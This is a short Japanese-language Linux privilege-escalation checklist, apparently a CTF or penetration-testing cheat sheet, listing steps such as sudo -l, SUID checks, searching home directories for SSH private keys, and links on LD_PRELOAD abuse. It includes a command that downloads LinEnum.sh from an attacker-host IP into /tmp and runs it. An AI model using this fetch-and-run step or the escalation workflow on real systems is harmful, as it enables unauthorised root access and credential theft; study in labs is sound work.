# Linux Privilege Escalation

## 実行フロー
1. sudo -l の実行
2. LinEnum の実行
3. ホームディレクトリの確認（一般ユーザーの存在や権限チェック、SSH 秘密鍵やフラグ、手がかりとなるファイルの確認）
4. Cron の確認
5. SUID / SGID の確認
6. Bash のバージョン確認
7. Sudo のバージョン確認


## 1. sudo -l の実行
### root 権限で実行可能なコマンドが存在する場合
[GTFOBins](https://gtfobins.github.io/) で検索

### ユーザー環境から継承された環境変数が存在する場合
- LD_PRELOAD が存在する場合は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privilege-escalation2.md#ld_preload-%E3%81%8C%E5%AD%98%E5%9C%A8%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88)  
- LD_LIBRARY_PATH が存在する場合は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privilege-escalation2.md#ld_library_path-%E3%81%8C%E5%AD%98%E5%9C%A8%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88)

## 2. LinEnum の実行
```
wget http://10.4.49.251/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh
cd /tmp && ./LinEnum.sh
```

## 3. ホームディレクトリの確認
- [ ] 一般ユーザーの存在や権限チェック、SSH 秘密鍵やフラグ、手がかりとなるファイルの確認）
